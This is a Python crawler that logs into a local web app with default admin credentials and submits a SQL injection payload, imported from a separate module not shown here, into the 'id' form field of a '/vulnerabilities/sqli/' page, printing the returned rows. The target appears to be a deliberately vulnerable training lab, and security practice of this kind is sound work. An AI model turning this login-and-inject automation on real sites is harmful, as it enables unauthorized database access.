import requests
from bs4 import BeautifulSoup
import mechanicalsoup
import injections
from exception import AuthException


class Crawler:
    login_data = {
        'username': 'admin',
        'password': 'password',
        'user_token': None
    }

    auth_url = 'http://localhost:11985/login.php'
    scrape_url = 'http://localhost:11985/vulnerabilities/sqli/'

    browser = None
    authenticated = False

    def run(self):
        self.authenticate()
        self.inject()

        #print(self.browser.list_links())
        # s = requests.session()
        # s.get(self.auth_url)
        #
        # if 'user_token' in s.cookies:
        #     self.login_data['user_token'] = s.cookies['user_token']
        #
        # s.post(self.auth_url, data=self.login_data)
        # url = s.get(url=self.scrape_url)
        # soup = BeautifulSoup(url.content, 'html.parser')
        #
        # print(s.cookies)
        #
        # for link in soup.findAll('a'):
        #     print('\nLink href: ' + link['href'])
        #     print('Link text: ' + link.text)
    def inject(self):
        self.browser.open(self.scrape_url)
        form = self.browser.select_form('form')
        form['id'] = injections.DATABASE_USERNAME

        self.browser.submit_selected()

        results = self.browser.get_current_page().select('pre')
        for result in results:
            print(result)

    def authenticate(self):
        browser = mechanicalsoup.StatefulBrowser(raise_on_404=True)
        browser.open(self.auth_url)

        form = browser.select_form('form')
        form['username'] = self.login_data['username']
        form['password'] = self.login_data['password']

        response = browser.submit_selected()

        if 'Logout' in response.text:
            self.browser = browser
        else:
            raise AuthException
